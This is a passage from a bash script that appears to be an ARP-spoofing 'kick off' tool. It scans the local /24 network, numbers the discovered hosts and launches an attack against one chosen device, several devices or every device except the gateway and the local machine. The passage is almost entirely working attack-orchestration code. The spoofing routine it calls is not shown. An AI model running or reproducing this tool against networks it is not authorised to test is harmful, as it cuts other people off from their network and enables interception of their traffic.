}

# --- Attack Modes ---
# These functions provide the main interactive modes for the user to select targets.

# kickoneoff:
# Guides the user to select a single target from the scanned host list
# and initiates the ARP spoofing attack against only that device.
kickoneoff() {
	echo -n "Enter the number of the host to kick off: "
	read -r choice

	TARGET_IP=$(echo "$HOSTS" | nl | sed -n "${choice}p" | awk '{print $2}')

	if [ -z "$TARGET_IP" ]; then
		echo "Invalid selection."
		exit 1
	fi

	start_attack "$GATEWAY_IP" "$INTERFACE" "$TARGET_IP"
}

# kicksomeoff:
# Allows the user to specify multiple targets by entering a comma-separated
# list of numbers corresponding to the hosts in the scanned list.
kicksomeoff() {
	echo -n "Enter the numbers of the hosts to kick off (comma-separated): "
	read -r choices

	TARGET_IPS=()
	IFS=',' read -ra ADDR <<<"$choices"
	for choice in "${ADDR[@]}"; do
		TARGET_IP=$(echo "$HOSTS" | nl | sed -n "${choice}p" | awk '{print $2}')
		if [ -z "$TARGET_IP" ]; then
			echo "Invalid selection: $choice."
		else
			TARGET_IPS+=("$TARGET_IP")
		fi
	done

	if [ ${#TARGET_IPS[@]} -eq 0 ]; then
		echo "No valid targets selected."
		exit 1
	fi

	start_attack "$GATEWAY_IP" "$INTERFACE" "${TARGET_IPS[@]}"
}

# kickalloff:
# Targets all devices on the network for ARP spoofing, with intelligent
# exclusions. It automatically avoids the gateway and the local machine,
# and offers an interactive prompt for the user to specify additional
# exclusions by host number.
kickalloff() {
	LOCAL_IP=$(get_local_ip "$INTERFACE")
	# EXCLUDED_IPS acts as a pipe-separated string for efficient lookup with grep.
	EXCLUDED_IPS="|$GATEWAY_IP|$LOCAL_IP|"

	echo "Kicking off all devices except gateway ($GATEWAY_IP) and this machine ($LOCAL_IP)..."
	read -r -p "Do you want to exclude any other targets? (y/n): " exclude_choice
	if [[ "$exclude_choice" == "y" || "$exclude_choice" == "Y" ]]; then
		read -r -p "Enter the numbers of the hosts to exclude (comma-separated): " exclude_numbers
		IFS=',' read -ra ADDR <<<"$exclude_numbers"
		for choice in "${ADDR[@]}"; do
			# Resolve the chosen number to an IP address from the HOSTS list
			EXCLUDED_IP=$(echo "$HOSTS" | nl | sed -n "${choice}p" | awk '{print $2}')
			if [ -n "$EXCLUDED_IP" ]; then
				EXCLUDED_IPS="$EXCLUDED_IPS$EXCLUDED_IP|" # Add to the exclusion string
			fi
		done
	fi

	TARGET_IPS=()
	while read -r line; do
		ip=$(echo "$line" | awk '{print $1}') # Extract IP from the scanned line
		# Check if the current IP is in the EXCLUDED_IPS string
		if ! echo "$EXCLUDED_IPS" | grep -q "|$ip|"; then
			TARGET_IPS+=("$ip") # Add to targets if not excluded
		fi
	done <<<"$HOSTS"

	if [ ${#TARGET_IPS[@]} -eq 0 ]; then
		echo "No other devices to kick off."
		exit 1
	fi

	start_attack "$GATEWAY_IP" "$INTERFACE" "${TARGET_IPS[@]}"
}

# --- Main Script ---
# This is the entry point and main control flow of the script.

# Initial menu display and help check:
# The menu is displayed first to allow quick access to help without
# performing network operations, improving user experience.
echo
echo "Choose an attack mode:"
echo "1) Kick one off"
echo "2) Kick some off"
echo "3) Kick all off"
echo "4) Help/About"
echo -n "Enter your choice: "
read -r mode

# Handle help request immediately
[ "$mode" -eq 4 ] && display_help

check_dependencies # Ensure all required tools are present before proceeding.

# Interface Detection and Selection:
# Dynamically identifies all active (UP) network interfaces (excluding loopback).
# If multiple are found, it provides an interactive menu for the user to choose.
interfaces=$(ip -br link | awk '$2 == "UP" {print $1}' | grep -v '^lo$')
num_interfaces=$(echo "$interfaces" | wc -l)

if [ "$num_interfaces" -eq 0 ]; then
	echo "Error: No active network interfaces found. Please ensure at least one interface is UP."
	exit 1
elif [ "$num_interfaces" -eq 1 ]; then
	INTERFACE=$interfaces
	echo "Using network interface: $INTERFACE"
else
	echo "Multiple network interfaces found. Please choose one:"
	select interface in $interfaces; do
		if [ -n "$interface" ]; then
			INTERFACE=$interface
			echo "You have selected interface: $INTERFACE"
			break # Exit select loop once a valid choice is made
		else
			echo "Invalid selection. Please try again."
		fi
	done
fi

GATEWAY_IP=$(get_gateway_ip_for_interface "$INTERFACE") # Get gateway for the chosen interface

if [ -z "$INTERFACE" ] || [ -z "$GATEWAY_IP" ]; then
	echo "Error: Could not determine network interface or gateway IP."
	exit 1
fi

echo "Gateway IP: $GATEWAY_IP"

# Determine network range for scanning:
# Derives the /24 network range from the identified gateway IP.
NETWORK_RANGE=$(echo "$GATEWAY_IP" | cut -d. -f1-3).0/24

echo "Scanning the network for hosts..."
HOSTS=$(scan_network "$NETWORK_RANGE") # Perform the actual network scan

if [ -z "$HOSTS" ]; then
	echo "No hosts found on the network."
	exit 0
fi

echo "Available hosts:"
echo "$HOSTS" | nl # Display the numbered list of discovered hosts

# Execute the chosen attack mode after all necessary information is gathered.
case "$mode" in
1)
	kickoneoff
	;;
2)
	kicksomeoff
	;;
3)
	kickalloff
	;;
*)
	# If help was chosen earlier, this case will be hit but display_help
	# already executed, so we just exit if the mode was 4. Otherwise, it's
	# an invalid mode, which should not happen if the earlier select is used.
	if [ "$mode" -ne 4 ]; then
		echo "Invalid choice. This should not happen."
		exit 1
	fi
	;;
esac
